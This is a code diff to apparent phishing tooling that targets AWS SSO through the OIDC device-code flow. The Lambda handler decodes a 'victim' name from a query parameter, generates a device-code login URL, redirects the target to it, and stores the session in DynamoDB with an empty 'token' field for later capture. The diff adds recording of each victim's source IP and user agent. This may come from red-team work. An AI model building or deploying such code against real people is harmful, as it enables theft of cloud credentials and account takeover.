@@ -37,9 +37,16 @@ def create_device_code_url(sso_oidc_client, start_url):
         sso_oidc_client, oidc_application, start_url)
     return url, device_code, oidc_application
 
-def save_to_db(url, deviceCode, oidc_application, victim=""):
+def save_to_db(url, deviceCode, oidc_application, event, victim=""):
     dynamodb = boto3.resource('dynamodb')
     table = dynamodb.Table('sessionTable')
+
+    try:
+        sourceIp = event['requestContext']['identity']['sourceIp']
+        userAgent = event['requestContext']['identity']['userAgent']
+    except Exception:
+        sourceIp = ""
+        userAgent = ""
 
     data={
         'deviceCode': deviceCode,
@@ -49,7 +56,9 @@ def save_to_db(url, deviceCode, oidc_application, victim=""):
         'oidc_app': oidc_application,
         'token': '',
         'urlExpires': Decimal(time.time() + 600),
-        'victim': victim
+        'victim': victim,
+        'sourceIp': sourceIp,
+        'userAgent': str(userAgent)
     }
 
     table.put_item(
@@ -70,7 +79,6 @@ def main(event, context):
     REGION = os.environ['REGION']
 
     victim = ""
-
     try:
         victim = decode_victim_name(str(event['queryStringParameters']['v']))
     except Exception:
@@ -80,7 +88,7 @@ def main(event, context):
 
     url, device_code, oidc_application = create_device_code_url(sso_oidc_client, START_URL)
 
-    save_to_db(url, device_code, oidc_application, victim)
+    save_to_db(url, device_code, oidc_application, event, victim)
 
     response = {
         "statusCode": 301,
